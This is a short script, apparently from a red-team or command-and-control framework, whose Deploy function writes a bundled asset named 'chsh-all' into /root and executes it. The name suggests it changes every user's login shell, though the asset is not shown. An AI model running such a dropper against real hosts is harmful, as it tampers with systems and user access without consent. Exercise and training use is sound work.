//priority:103
//timeout:60

//import:chsh-all

function Deploy() {
    var chsh = GetAssetAsBytes("chsh-all");
    var path = "/root/chsh-all";

    G.file.WriteFileFromBytes(path, chsh[0]);
    G.exec.ExecuteCommandAsync(path, [""]);
}

